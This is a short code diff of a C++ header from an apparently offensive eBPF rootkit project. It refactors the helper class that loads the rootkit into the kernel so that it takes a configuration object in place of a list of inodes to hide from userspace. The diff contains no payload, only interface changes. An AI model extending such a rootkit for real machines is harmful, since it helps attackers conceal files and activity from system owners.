@@ -6,24 +6,25 @@
 #include <optional>
 #include <vector>
 #include "rootkit.skel.h"
+#include "rootkit/ConfigManager.hpp"
 
 namespace rootkit {
 
 class RootkitBpfHelper {
 private:
+    RootkitBpfConfig conf;
     struct rootkit_bpf * skel;
     struct ring_buffer * rb;
-    std::vector<uint64_t> inodes_to_hide;
     std::string error_msg;
 
 public:
     /**
      * @brief Load rootkit bpf (src/ebpf/rootkit) into the kernel
-     * @param  inode_to_hide Inode that will be hidden in userspace
+     * @param conf Configuration
      * @param rb_callback Callback function that will be called every time ring
      * buffer receives data
      */
-    RootkitBpfHelper(std::vector<uint64_t> inodes_to_hide,
+    RootkitBpfHelper(const RootkitBpfConfig& conf,
         int (* rb_callback)(void *, void *, unsigned long));
 
     /**
